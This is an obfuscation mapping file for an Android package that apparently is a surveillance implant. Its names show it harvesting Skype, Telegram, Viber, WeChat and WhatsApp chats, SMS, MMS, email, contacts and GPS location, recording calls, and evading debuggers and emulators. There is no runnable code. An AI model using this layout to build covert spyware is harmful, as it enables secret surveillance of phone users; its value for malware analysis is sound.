android.media.AmrInputStream -> android.media.AmrInputStream:
    java.lang.String pObserving -> eY
    java.util.concurrent.Semaphore readChatSemaphore -> gs
    com.android.dvci.module.chat.ChatSkype$ChatSkypeGroups groups$7ddadd82 -> gX
    java.lang.String dbDir -> gY
    47:47:int getProgramId() -> di
    52:52:java.lang.String getObservingProgram() -> dj
    58:64:void notifyStopProgram(java.lang.String) -> link_size
    70:77:void start() -> start
    91:160:void readSkypeMessageHistory() -> dp
    165:194:com.android.dvci.db.GenericSqliteHelper openSkypeDBHelper(java.lang.String) -> class_defs_off
    198:231:void saveSkypeContacts(com.android.dvci.db.GenericSqliteHelper) -> zygotevar
    235:259:java.util.ArrayList getSkypeConversations$2512e546(com.android.dvci.db.GenericSqliteHelper,java.lang.String) -> localvar
    268:338:long fetchMessages(com.android.dvci.db.GenericSqliteHelper,com.android.dvci.module.chat.SkypeConversation,long) -> Code
    345:358:void fetchGroup(com.android.dvci.db.GenericSqliteHelper,java.lang.String) -> localclass
    362:386:java.lang.String readAccount() -> dq
    392:393:void saveEvidence(java.util.ArrayList) -> inst
    397:422:boolean getCurrentCall(com.android.dvci.db.GenericSqliteHelper,com.android.dvci.module.call.CallInfo) -> Code
com.android.dvci.module.chat.ChatSkype$1 -> stt.bi:
    com.android.dvci.module.chat.ChatSkype this$0 -> gZ
    206:221:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatSkype$2 -> stt.bj:
    java.lang.String val$account -> gJ
    java.util.ArrayList val$conversations$7865b31 -> gK
    com.android.dvci.module.chat.ChatSkype this$0 -> gZ
    244:254:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatSkype$3 -> stt.bk:
    com.android.dvci.module.chat.SkypeConversation val$conversation -> ha
    java.util.ArrayList val$messages -> gA
    com.android.dvci.module.chat.ChatSkype this$0 -> gZ
    280:320:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatSkype$4 -> stt.bl:
    java.lang.String val$conversation -> hb
    com.android.dvci.module.chat.ChatSkype this$0 -> gZ
    351:353:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatSkype$5 -> stt.bm:
    com.android.dvci.module.call.CallInfo val$callInfo -> hc
    403:416:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatSkype$ChatSkypeGroups -> stt.bh$Code:
    com.android.dvci.module.chat.ChatSkype this$0 -> gZ
    430:430:boolean isGroup(java.lang.String) -> method_ids_off
com.android.dvci.module.chat.ChatTelegram -> stt.bn:
    java.lang.String pObserving -> eY
    java.lang.String dbFile -> gR
    java.lang.String dbAccountFile -> gS
    long lastTelegram -> hd
    java.util.concurrent.Semaphore readChatSemaphore -> gs
    com.android.dvci.module.chat.ChatTelegram$Account account -> he
    boolean firstTime -> gu
    boolean started -> started
    boolean old_format_chat -> hf
    88:88:int getProgramId() -> di
    93:93:java.lang.String getObservingProgram() -> dj
    101:102:void notifyStopProgram(java.lang.String) -> link_size
    109:110:boolean frequentNotification$552c4dfd() -> dr
    118:161:void updateHistory(boolean) -> constants
    170:215:void start() -> start
    221:227:int truncatedEquals(byte[],int,byte[],int) -> localvar
    231:311:com.android.dvci.db.GenericSqliteHelper openCopy(java.lang.String) -> lua
    315:320:java.lang.String fixThreeSemicolons(java.lang.String) -> data_size
    324:345:com.android.dvci.module.chat.ChatTelegram$Account readAddressContacts(com.android.dvci.db.GenericSqliteHelper) -> zygoteclass
    384:420:com.android.dvci.module.chat.ChatTelegram$Account readMyPhoneNumber(java.lang.String) -> data_off
    433:451:long readTelegramChatHistory(com.android.dvci.db.GenericSqliteHelper,boolean) -> Code
    459:477:long readTelegramPlainChatHistory(com.android.dvci.db.GenericSqliteHelper) -> mymethod
    483:493:long readTelegramSecureChatHistory(com.android.dvci.db.GenericSqliteHelper) -> myclass
    497:522:long readTelegramGroupChatHistory(com.android.dvci.db.GenericSqliteHelper) -> myvar
    528:613:java.util.ArrayList getTelegramGroups$590cbb20(com.android.dvci.db.GenericSqliteHelper,com.android.dvci.db.RecordHashPairVisitor,com.android.dvci.module.chat.ChatGroups) -> Code
    617:690:java.util.ArrayList getContentFromBlob(byte[]) -> lua_true
    807:825:java.lang.String readString(java.nio.ByteBuffer) -> Code
    832:838:int readInt32(java.nio.ByteBuffer) -> localvar
    858:869:boolean readBool(java.nio.ByteBuffer) -> localclass
    39:39:java.lang.String access$000$38ccfcc0(java.lang.String) -> a
    39:39:com.android.dvci.module.chat.ChatTelegram$Account access$100(com.android.dvci.module.chat.ChatTelegram) -> Code
    39:39:java.util.ArrayList access$200(com.android.dvci.module.chat.ChatTelegram,byte[]) -> Code
    39:39:boolean access$300(com.android.dvci.module.chat.ChatTelegram) -> localvar
com.android.dvci.module.chat.ChatTelegram$1 -> stt.bo:
    com.android.dvci.module.chat.ChatTelegram this$0 -> hg
    332:338:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatTelegram$3 -> stt.bp:
    java.util.ArrayList val$conversations$7865b31 -> gK
    com.android.dvci.db.RecordHashPairVisitor val$users -> hh
    com.android.dvci.module.chat.ChatGroups val$groups -> gx
    com.android.dvci.module.chat.ChatTelegram this$0 -> hg
    536:554:long cursor(android.database.Cursor) -> Code
    558:582:void unWrapParticipants(com.android.dvci.module.chat.ChatTelegram$TelegramConversation,byte[]) -> Code
    585:601:void unWrapChat(com.android.dvci.module.chat.ChatTelegram$TelegramConversation,byte[]) -> localvar
com.android.dvci.module.chat.ChatTelegram$Account -> stt.bn$Code:
    int id -> id
    java.lang.String name -> name
    java.lang.String last_name -> hi
    com.android.dvci.module.chat.ChatTelegram this$0 -> hg
    58:58:java.lang.String getName() -> getName
com.android.dvci.module.chat.ChatTelegram$MessageGroupVisitor -> stt.bn$localvar:
    java.util.ArrayList messages -> hj
    com.android.dvci.module.chat.ChatGroups groups -> bt
    com.android.dvci.db.RecordHashPairVisitor users -> hk
    com.android.dvci.module.chat.ChatTelegram this$0 -> hg
    707:750:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatTelegram$MessageRecordVisitor -> stt.bn$localclass:
    java.util.ArrayList messages -> hj
    com.android.dvci.module.chat.ChatTelegram this$0 -> hg
    763:801:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatTelegram$TelegramConversation -> stt.bn$instance:
    com.android.dvci.module.chat.ChatTelegram$Account account -> he
    long uid -> hl
    java.lang.String name -> name
    java.util.ArrayList participants$7865b31 -> hm
    java.lang.String title -> hn
    com.android.dvci.module.chat.ChatTelegram this$0 -> hg
com.android.dvci.module.chat.ChatViber -> stt.bq:
    java.lang.String pObserving -> eY
    java.lang.String dbDir -> gY
    java.lang.String dbChatFile -> ho
    java.lang.String dbCallFile -> hp
    java.lang.Long lastViberReadDate -> hq
    java.util.concurrent.Semaphore readChatSemaphore -> gs
    com.android.dvci.module.chat.ChatViber$ChatViberGroups groups$7ddadd82 -> hr
    java.util.Hashtable hastableConversationLastIndex -> hs
    java.lang.String account -> fH
    45:45:int getProgramId() -> di
    50:50:java.lang.String getObservingProgram() -> dj
    55:56:void notifyStopProgram(java.lang.String) -> link_size
    60:71:void start() -> start
    74:96:java.lang.String readAccount() -> dq
    111:167:void readViberMessageHistory() -> ds
    171:171:com.android.dvci.db.GenericSqliteHelper openViberDBHelperCall() -> dt
    175:175:com.android.dvci.db.GenericSqliteHelper openViberDBHelperChat() -> du
    181:205:java.util.ArrayList getViberConversations$7fa5c965(com.android.dvci.db.GenericSqliteHelper,java.lang.String,java.lang.Long) -> Code
    215:247:void fetchParticipants(com.android.dvci.db.GenericSqliteHelper,java.lang.String) -> instance
    254:332:long fetchMessages(com.android.dvci.db.GenericSqliteHelper,com.android.dvci.module.chat.ViberConversation,long) -> Code
    342:356:void updateMarkupViber$256a6c5(long) -> variables
    359:360:void saveEvidence(java.util.ArrayList) -> inst
    363:385:boolean getCurrentCall(com.android.dvci.db.GenericSqliteHelper,com.android.dvci.module.call.CallInfo) -> Code
    25:25:java.lang.String access$000(com.android.dvci.module.chat.ChatViber) -> Code
com.android.dvci.module.chat.ChatViber$1 -> stt.br:
    java.lang.String val$account -> gJ
    java.util.ArrayList val$conversations$7865b31 -> gK
    com.android.dvci.module.chat.ChatViber this$0 -> ht
    190:199:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatViber$2 -> stt.bs:
    java.lang.String val$thread_id -> gO
    com.android.dvci.module.chat.ChatViber this$0 -> ht
    219:240:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatViber$3 -> stt.bt:
    com.android.dvci.module.chat.ViberConversation val$conversation -> hu
    java.util.ArrayList val$messages -> gA
    com.android.dvci.module.chat.ChatViber this$0 -> ht
    265:316:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatViber$4 -> stt.bu:
    com.android.dvci.module.call.CallInfo val$callInfo -> hc
    369:380:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatViber$ChatViberGroups -> stt.bq$Code:
    com.android.dvci.module.chat.ChatViber this$0 -> ht
com.android.dvci.module.chat.ChatWeChat -> stt.bv:
    java.lang.String DEFAULT_LOCAL_NUMBER -> hv
    java.lang.String pObserving -> eY
    java.lang.String myId -> hw
    java.lang.String myName -> hx
    java.lang.String myPhone -> ec
    java.util.concurrent.Semaphore readChatSemaphore -> gs
    java.lang.Long lastLine -> hy
    42:42:int getProgramId() -> di
    47:47:java.lang.String getObservingProgram() -> dj
    56:58:void notifyStopProgram(java.lang.String) -> link_size
    71:73:void start() -> start
    92:202:void readChatWeChatMessages() -> dv
    210:272:long fetchMessages(com.android.dvci.db.GenericSqliteHelper,com.android.dvci.module.chat.ChatGroups,long) -> Code
    276:306:void saveWechatContacts(com.android.dvci.db.GenericSqliteHelper) -> sort
    309:334:void setMyAccount(com.android.dvci.db.GenericSqliteHelper) -> myarray
    338:366:com.android.dvci.module.chat.ChatGroups getChatGroups(com.android.dvci.db.GenericSqliteHelper) -> quicksort
com.android.dvci.module.chat.ChatWeChat$1 -> stt.bw:
    com.android.dvci.module.chat.ChatGroups val$groups -> gx
    java.util.ArrayList val$messages -> gA
    com.android.dvci.module.chat.ChatWeChat this$0 -> hz
    217:265:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatWeChat$2 -> stt.bx:
    com.android.dvci.module.chat.ChatWeChat this$0 -> hz
    284:296:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatWeChat$3 -> stt.by:
    com.android.dvci.module.chat.ChatWeChat this$0 -> hz
    313:321:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatWeChat$4 -> stt.bz:
    com.android.dvci.module.chat.ChatGroups val$groups -> gx
    com.android.dvci.module.chat.ChatWeChat this$0 -> hz
    343:359:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatWhatsapp -> stt.bA:
    com.android.dvci.module.chat.ChatWhatsapp$ChatWhatsappGroups groups$7ddadd82 -> hA
    java.lang.String pObserving -> eY
    java.lang.String myPhoneNumber -> hB
    java.util.concurrent.Semaphore readChatSemaphore -> gs
    byte[] $ -> lua_repeat
    45:45:int getProgramId() -> di
    50:50:java.lang.String getObservingProgram() -> dj
    60:66:void notifyStopProgram(java.lang.String) -> link_size
    80:100:void start() -> start
    103:155:java.lang.String readMyPhoneNumber() -> dw
    173:248:void readChatWhatsappMessages() -> dx
    261:282:void fetchGroup(com.android.dvci.db.GenericSqliteHelper,java.lang.String) -> localclass
    295:326:java.util.ArrayList fetchConversation(android.database.sqlite.SQLiteDatabase,long) -> Code
    341:414:long fetchMessages(android.database.sqlite.SQLiteDatabase,java.lang.String,long) -> Code
    418:422:java.lang.String clean(java.lang.String) -> b
    30:30:java.lang.String access$000$4a088f11(java.lang.String) -> c
    java.lang.String $$24d420ae() -> proto_ids
com.android.dvci.module.chat.ChatWhatsapp$1 -> stt.bB:
    java.lang.String val$conversation -> hb
    com.android.dvci.module.chat.ChatWhatsapp this$0 -> hC
    271:276:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatWhatsapp$ChatWhatsappGroups -> stt.bA$Code:
    com.android.dvci.module.chat.ChatWhatsapp this$0 -> hC
    428:428:boolean isGroup(java.lang.String) -> method_ids_off
com.android.dvci.module.chat.Contact -> stt.bC:
    java.lang.String id -> hD
    java.lang.String number -> variables
    java.lang.String name -> name
    java.lang.String extra -> hE
    32:32:java.lang.String toString() -> toString
    38:40:long getId() -> getId
com.android.dvci.module.chat.FbConversation -> stt.bD:
    java.lang.String account -> fH
    java.lang.String id -> hD
    com.android.dvci.module.chat.Contact[] contacts -> hF
    long timestamp -> timestamp
    11:17:java.lang.String getTo(java.lang.String) -> d
    21:27:java.lang.String getDisplayTo(java.lang.String) -> e
com.android.dvci.module.chat.HangoutConversation -> stt.bE:
    java.lang.String account -> fH
    java.lang.String id -> hD
    long date -> hG
    boolean group -> hH
    java.lang.String remote -> hI
    12:12:boolean isGroup() -> dy
com.android.dvci.module.chat.MessageChat -> stt.bF:
    java.lang.String body -> hJ
    java.util.Date timestamp -> cr
    boolean incoming -> mylist
    int programId -> fK
    java.lang.String from -> hK
    java.lang.String to -> hL
    java.lang.String displayFrom -> hM
    java.lang.String displayTo -> hN
com.android.dvci.module.chat.SkypeConversation -> stt.bG:
    long lastReadIndex -> hO
    java.lang.String account -> fH
    int id -> id
    java.lang.String remote -> hI
    java.lang.String displayname -> hP
    java.lang.String given -> hQ
    long timestamp -> timestamp
com.android.dvci.module.chat.SubModuleChat -> stt.bH:
    java.util.concurrent.ScheduledFuture future -> dG
    com.android.dvci.RunningProcesses runningProcesses -> er
    32:32:void start() -> start
    41:42:void startListen() -> cX
    46:47:void stopListen() -> cY
    54:61:int notification(com.android.dvci.Standby) -> Code
    67:89:int notification(com.android.dvci.ProcessInfo) -> Code
    93:93:com.android.dvci.module.chat.SubModuleChat$1 getFrequentRunnable$501bdd35(java.lang.String) -> f
    113:113:boolean frequentNotification$552c4dfd() -> dr
    117:117:com.android.dvci.module.ModuleChat getModule() -> dz
    void notifyStopProgram(java.lang.String) -> link_size
    int getProgramId() -> di
    java.lang.String getObservingProgram() -> dj
    18:18:int notification(java.lang.Object) -> Code
com.android.dvci.module.chat.SubModuleChat$1 -> stt.bI:
    java.lang.String val$processInfo -> hR
    com.android.dvci.module.chat.SubModuleChat this$0 -> hS
    100:108:void run() -> run
com.android.dvci.module.chat.ViberConversation -> stt.bJ:
    java.lang.String account -> fH
    long id -> id
    long date -> hG
    java.lang.String remote -> hI
    boolean group -> hH
    12:12:boolean isGroup() -> dy
com.android.dvci.module.email.Email -> stt.bK:
    java.util.Date timestamp -> cr
    java.lang.String fromAddress -> hT
    java.lang.String toAddresses -> hU
    java.lang.String ccAddresses -> hV
    java.lang.String body -> hJ
    java.lang.String snippet -> hW
    java.lang.String subject -> hX
    boolean incoming -> mylist
    32:86:java.lang.String makeMimeMessage$47921032() -> dA
    90:90:boolean isMultipart() -> dB
    94:94:java.util.Date getReceivedDate() -> dC
    98:98:boolean isIncoming() -> eval
    102:102:long getDate() -> getDate
com.android.dvci.module.email.GmailVisitor -> stt.bL:
    boolean initialized -> aa
    com.android.dvci.module.ModuleMessage moduleMessage -> hY
    java.lang.String mailstore -> hZ
    java.lang.String[] projection -> projection
    java.lang.String selection -> selection
    int lastId -> ia
    java.lang.String from -> hK
    com.android.dvci.module.message.Filter filter -> ib
    44:61:java.lang.String decompress(byte[]) -> lua_until
    67:105:long cursor(android.database.Cursor) -> Code
    109:113:void initialize$7b4aafc2() -> dD
    117:117:java.lang.String[] getProjection() -> getProjection
    122:126:java.lang.String getSelection() -> getSelection
    131:131:boolean isStopRequested() -> S
com.android.dvci.module.message.Filter -> stt.bM:
    boolean enabled -> enabled
    boolean doFilterFromDate -> ic
    java.util.Date fromDate -> ie
    boolean doFilterToDate -> if
    java.util.Date toDate -> ig
    int maxMessageSize -> ih
    int maxMessageSizeToLog -> ii
    java.util.Vector keywords -> ij
    85:108:int filterMessage$4876ee43$2566aa8(long) -> mylist
    121:140:boolean equals(java.lang.Object) -> equals
    144:157:int hashCode() -> hashCode
    162:195:java.lang.String toString() -> toString
com.android.dvci.module.message.Mms -> stt.bN:
    boolean SENT -> ik
    java.lang.String address -> il
    java.lang.String subject -> hX
    java.lang.String body -> hJ
    long date -> hG
    boolean sent -> im
    int id -> id
    67:67:java.lang.String getAddress() -> getAddress
    75:75:java.lang.String getSubject() -> getSubject
    87:87:long getDate() -> getDate
    91:91:boolean getSent() -> dE
    111:111:int getId() -> getId
    115:115:boolean isValid() -> isValid
    119:119:java.lang.String getBody() -> getBody
com.android.dvci.module.message.MmsBrowser -> stt.bO:
    java.util.ArrayList list -> in
    int maxId -> io
    39:48:java.util.ArrayList getMmsList(int) -> lua_do
    55:117:void parse(java.lang.String,boolean,int) -> Code
    122:141:java.lang.String extractNumber(java.lang.String,java.lang.String[],java.lang.String) -> Code
    148:169:java.lang.String extractBody(java.lang.String) -> g
    183:206:java.lang.String getMmsText(java.lang.String) -> h
    210:226:java.lang.String getAddressNumber(java.lang.String) -> i
    230:230:int getMaxId() -> dF
com.android.dvci.module.message.MsgHandler -> stt.bP:
    com.android.dvci.module.message.MsgHandler$1 handler$2ace4d50 -> ip
    com.android.dvci.module.message.MsgObserver msgObserver$18a11b74 -> iq
    boolean smsEnabled -> eJ
    boolean mmsEnabled -> eK
    38:70:void run() -> run
    73:76:void quit() -> quit
com.android.dvci.module.message.MsgHandler$1 -> stt.bQ:
    com.android.dvci.module.message.MsgHandler this$0 -> ir
    47:47:void handleMessage(android.os.Message) -> handleMessage
com.android.dvci.module.message.MsgObserver -> stt.bR:
    boolean mmsEnabled -> eK
    boolean smsEnabled -> eJ
    long changeDelay -> is
    android.os.Handler h -> it
    42:51:void onChange(boolean) -> onChange
    61:62:void run() -> run
    69:122:void actualBrowsing() -> dG
com.android.dvci.module.message.MsgObserver$1 -> stt.bS:
    com.android.dvci.module.message.MsgObserver this$0 -> iu
    35:36:boolean handleMessage(android.os.Message) -> handleMessage
com.android.dvci.module.message.Sms -> stt.bT:
    java.lang.String address -> il
    java.lang.String body -> hJ
    long date -> hG
    boolean sent -> im
    java.lang.String read -> iv
    java.lang.String protocol -> protocol
    java.lang.String thread_id -> iw
    java.lang.String status -> ix
    java.lang.String type -> type
    java.lang.String reply_path -> iy
    int id -> id
    95:95:java.lang.String getAddress() -> getAddress
    107:107:java.lang.String getBody() -> getBody
    123:123:long getDate() -> getDate
    127:127:boolean getSent() -> dE
    143:144:void setThreadId(java.lang.String) -> j
    151:152:void setProtocol(java.lang.String) -> k
    159:160:void setRead(java.lang.String) -> l
    167:168:void setStatus(java.lang.String) -> m
    175:176:void setType(java.lang.String) -> n
    183:184:void setReplyPath(java.lang.String) -> o
    204:204:boolean isValid() -> isValid
com.android.dvci.module.message.SmsBrowser -> stt.bU:
    java.util.ArrayList list -> in
    int id -> id
    int maxId -> io
    37:44:java.util.ArrayList getSmsList(int) -> lua_else
    52:208:int parse(java.lang.String,int) -> instance
    212:224:void printColumnsSms(android.database.Cursor) -> localvar
    231:231:int getMaxId() -> dF
com.android.dvci.module.position.GPSLocationListener -> stt.bV:
    void onLocationChanged(android.location.Location) -> onLocationChanged
com.android.dvci.module.position.GPSLocator -> stt.bW:
    android.location.LocationManager lm -> iz
    android.location.LocationListener listener -> iA
    java.lang.String provider -> iB
    android.os.Looper myLooper -> iC
    byte[] $ -> lua_repeat
    int $$ -> iD
    void initLocationUpdates() -> dH
    49:54:void run() -> run
    61:62:void setListener(android.location.LocationListener) -> Code
    65:65:android.location.Location getLastKnownPosition() -> dI
    69:78:void halt() -> bb
    84:94:void turnGPSOn() -> dJ
    100:110:void turnGPSOff() -> dK
    116:137:boolean canToggleGPS() -> dL
    141:145:boolean isGPSEnabled() -> dM
    java.lang.String $(int,int,int) -> localvar
com.android.dvci.module.position.GPSLocatorAuto -> stt.bX:
    com.android.dvci.module.position.GPSLocatorAuto instance -> iE
    java.util.ArrayList listeners$7865b31 -> iF
    com.android.dvci.module.position.GPSLocatorPeriod locator -> iG
    long stopDelay -> iH
    boolean gotValidPosition -> iI
    boolean turnedOn -> iJ
    37:49:com.android.dvci.module.position.GPSLocatorAuto self() -> dN
    63:116:boolean start(com.android.dvci.module.position.GPSLocationListener) -> Code
    123:130:void unregister$2443f7a3(com.android.dvci.action.SmsAction) -> Code
    135:162:void stop() -> stop
    171:179:void run() -> run
    189:201:void onLocationChanged(android.location.Location) -> onLocationChanged
    208:208:void onProviderDisabled(java.lang.String) -> onProviderDisabled
    214:214:void onProviderEnabled(java.lang.String) -> onProviderEnabled
    220:220:void onStatusChanged(java.lang.String,int,android.os.Bundle) -> onStatusChanged
com.android.dvci.module.position.GPSLocatorDistance -> stt.bY:
    float latitude -> iK
    float longitude -> iL
    float distance -> iM
    com.android.dvci.event.EventLocation rangeObserver$2c18d9f8$1094ee4d -> iN
    android.location.Location location -> iO
    boolean entered -> bP
    45:46:void initLocationUpdates() -> dH
    49:81:void onLocationChanged(android.location.Location) -> onLocationChanged
    88:88:void onProviderDisabled(java.lang.String) -> onProviderDisabled
    94:94:void onProviderEnabled(java.lang.String) -> onProviderEnabled
    100:100:void onStatusChanged(java.lang.String,int,android.os.Bundle) -> onStatusChanged
com.android.dvci.module.position.GPSLocatorPeriod -> stt.bZ:
    int period -> do
    27:28:void initLocationUpdates() -> dH
com.android.dvci.module.task.Contact -> stt.ca:
    com.android.dvci.module.task.UserInfo userInfo -> iP
    java.util.ArrayList emailInfo$7865b31 -> iQ
    java.util.ArrayList paInfo$7865b31 -> iR
    java.util.ArrayList phoneInfo$7865b31 -> iS
    java.util.ArrayList imInfo$7865b31 -> iT
    java.util.ArrayList orgInfo$7865b31 -> iU
    java.util.ArrayList webInfo$7865b31 -> iV
    40:41:void add(com.android.dvci.module.task.EmailInfo) -> Code
    44:45:void add(com.android.dvci.module.task.PostalAddressInfo) -> Code
    48:49:void add(com.android.dvci.module.task.PhoneInfo) -> Code
    52:53:void add(com.android.dvci.module.task.ImInfo) -> Code
    56:57:void add(com.android.dvci.module.task.OrganizationInfo) -> Code
    60:61:void add(com.android.dvci.module.task.WebsiteInfo) -> Code
    64:64:com.android.dvci.module.task.UserInfo getUserInfo() -> dO
    76:76:java.util.ArrayList getPhoneInfo$5679c1ce() -> dP
    93:101:java.lang.String toString() -> toString
    105:173:java.lang.String getInfo() -> getInfo
    177:177:long getId() -> getId
com.android.dvci.module.task.EmailInfo -> stt.cb:
    long userId -> iW
    int emailType -> iX
    java.lang.String email -> iY
    30:30:int getEmailType() -> dQ
    34:34:java.lang.String getEmail() -> dR
com.android.dvci.module.task.ImInfo -> stt.cc:
    long userId -> iW
    int imType -> iZ
    java.lang.String im -> ja
    30:30:int getImType() -> dS
    34:34:java.lang.String getIm() -> dT
com.android.dvci.module.task.OrganizationInfo -> stt.cd:
    int userId -> jb
    int type -> type
    java.lang.String companyName -> jc
    java.lang.String companyTitle -> jd
    32:32:int getType() -> getType
    36:36:java.lang.String getCompanyName() -> dU
    40:40:java.lang.String getCompanyTitle() -> dV
com.android.dvci.module.task.PhoneInfo -> stt.ce:
    long userId -> iW
    int phoneType -> je
    java.lang.String phoneNumber -> jf
    30:30:int getPhoneType() -> getPhoneType
    34:34:java.lang.String getPhoneNumber() -> lua_not
com.android.dvci.module.task.PickContact -> stt.cf:
    byte[] $ -> lua_repeat
    30:52:void addUserPhones(android.content.ContentResolver,android.database.Cursor,java.util.Hashtable) -> Code
    56:73:void addUserEmails(android.content.ContentResolver,android.database.Cursor,java.util.Hashtable) -> localvar
    77:111:void addUserInfos(android.content.ContentResolver,android.database.Cursor,java.util.Hashtable) -> localclass
    115:151:void addUserPA(android.content.ContentResolver,android.database.Cursor,java.util.Hashtable) -> instance
    155:176:void addUserIm(android.content.ContentResolver,android.database.Cursor,java.util.Hashtable) -> inst
    180:205:void addUserOrg(android.content.ContentResolver,android.database.Cursor,java.util.Hashtable) -> variables
    209:230:void addUserWebsite(android.content.ContentResolver,android.database.Cursor,java.util.Hashtable) -> mylist
    233:251:java.util.Hashtable getContactInfo() -> dW
    java.lang.String $(int,int,int) -> localvar
com.android.dvci.module.task.PostalAddressInfo -> stt.cg:
    long userId -> iW
    int type -> type
    java.lang.String street -> jg
    java.lang.String poBox -> jh
    java.lang.String neighbor -> ji
    java.lang.String city -> jj
    java.lang.String state -> jk
    java.lang.String postalCode -> jl
    java.lang.String country -> jm
    39:39:int getType() -> getType
    43:43:java.lang.String getStreet() -> dX
    47:47:java.lang.String getPoBox() -> dY
    51:51:java.lang.String getNeighbor() -> dZ
    55:55:java.lang.String getCity() -> ea
    59:59:java.lang.String getState() -> eb
    63:63:java.lang.String getPostalCode() -> getPostalCode
    67:67:java.lang.String getCountry() -> getCountry
com.android.dvci.module.task.UserInfo -> stt.ch:
    java.lang.String completeName -> jn
    java.lang.String userNote -> jo
    java.lang.String userNickname -> jp
    long userId -> iW
    26:26:java.lang.String getCompleteName() -> ec
    30:30:java.lang.String getUserNote() -> ed
    34:34:java.lang.String getUserNickname() -> ee
    38:38:long getUserId() -> ef
com.android.dvci.module.task.WebsiteInfo -> stt.ci:
    long userId -> iW
    java.lang.String websiteName -> jq
    28:28:java.lang.String getWebsiteName() -> eg
com.android.dvci.optimize.NetworkOptimizer -> com.android.dvci.optimize.NetworkOptimizer:
    android.content.Context context -> a
    boolean stop -> W
    long BeforeTime -> jr
    24:30:void start(int) -> lua_elseif
    43:70:boolean isNotOptimized() -> eh
    74:87:boolean getResults(long[]) -> localclass
    14:14:long access$002(com.android.dvci.optimize.NetworkOptimizer,long) -> Code
    14:14:long access$000(com.android.dvci.optimize.NetworkOptimizer) -> Code
com.android.dvci.optimize.NetworkOptimizer$1 -> stt.cj:
    java.lang.String val$host -> js
    com.android.dvci.optimize.NetworkOptimizer this$0 -> jt
    50:64:void run() -> run
com.android.dvci.util.AntiDebug -> stt.ck:
    byte[] $ -> lua_repeat
    35:39:boolean checkFlag() -> ei
    58:58:boolean checkConnected() -> ej
    67:67:boolean isDebug() -> ek
    71:83:boolean isPlayStore() -> el
    java.lang.String $(int,int,int) -> localvar
com.android.dvci.util.AntiEmulator -> stt.cl:
    int NUMTESTSTM -> ju
    int NUMTESTSNOTM -> jv
    android.telephony.TelephonyManager tm -> jw
    24:53:int checkKeys() -> em
    58:71:int checkTags() -> en
    76:87:int checkProduct() -> eo
    92:103:int checkDevice() -> ep
    108:125:int checkBrand() -> eq
    129:148:int checkScaling() -> er
    153:166:int checkManufacturer() -> es
    171:188:int checkId() -> et
    193:211:int checkSubscriber() -> eu
    216:229:int checkOperator() -> ev
    234:263:int checkPhoneNumber() -> ew
    267:294:int isEmu(int) -> lua_end
    298:302:int isEmu(int[]) -> Code
    310:313:boolean isEmu() -> ex
    319:330:boolean isTestEmu() -> ey
com.android.dvci.util.AudioEncoder -> stt.cm:
    java.lang.String audioDirectory -> jx
    java.lang.String audioStorage -> jy
    boolean call_finished -> jz
    int last_epoch -> jA
    int first_epoch -> jB
    int data_size -> jC
    int sampleRate -> jD
    java.lang.String rawFile -> jE
    byte[] rawPcm -> jF
    byte[] $ -> lua_repeat
    50:112:int getInferredSampleRate() -> ez
    117:164:boolean encodetoAmr(java.lang.String,byte[]) -> localvar
    170:202:byte[] resample(boolean) -> globalize
    206:337:byte[] decodeRawChunks() -> eA
    343:356:void removeRawFile() -> eB
    362:362:int getCallStartTime() -> eC
    366:366:int getCallEndTime() -> eD
    374:374:int getAllegedSampleRate() -> eE
    378:378:boolean isLastCallFinished() -> eF
    383:398:boolean createAudioStorage() -> eG
    403:407:java.lang.String getAudioStorage() -> eH
    411:423:boolean deleteAudioStorage() -> eI
